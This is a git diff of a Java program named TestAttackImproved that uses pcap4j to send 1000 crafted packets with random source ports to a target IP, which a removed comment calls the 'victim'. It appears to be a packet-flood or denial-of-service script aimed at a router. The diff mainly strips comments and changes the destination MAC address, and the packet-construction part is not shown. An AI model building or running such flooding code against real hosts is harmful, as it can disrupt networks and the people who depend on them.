@@ -12,8 +12,8 @@ import java.util.Random;
 public class TestAttackImproved {
 
     public static void main(String[] args) throws PcapNativeException, NotOpenException, UnknownHostException, InterruptedException {
-        String targetIpStr = "192.168.0.1";  // IP жертвы
-        String myIpStr = "192.168.0.105";    // IP твоего интерфейса
+        String targetIpStr = "192.168.0.1";
+        String myIpStr = "192.168.0.105";
 
         PcapNetworkInterface nif = getNetworkInterfaceByIp(myIpStr);
         if (nif == null) {
@@ -30,8 +30,7 @@ public class TestAttackImproved {
 
         System.out.println("MAC интерфейса: " + srcMac);
 
-        // MAC назначения (например MAC роутера/шлюза)
-        MacAddress dstMac = MacAddress.getByName("e4:fa:c4:10:13:ef");
+        MacAddress dstMac = MacAddress.getByName("be:a5:8b:c1:8b:78");
 
         PcapHandle handle = nif.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
 
@@ -39,6 +38,7 @@ public class TestAttackImproved {
         Inet4Address dstIp = (Inet4Address) InetAddress.getByName(targetIpStr);
 
         Random random = new Random();
+
 
         for (int i = 0; i < 1000; i++) {  // отправить 1000 пакетов
             short srcPort = (short) (1024 + random.nextInt(60000));  // случайный исходящий порт
@@ -101,3 +101,4 @@ public class TestAttackImproved {
         return null;
     }
 }
+
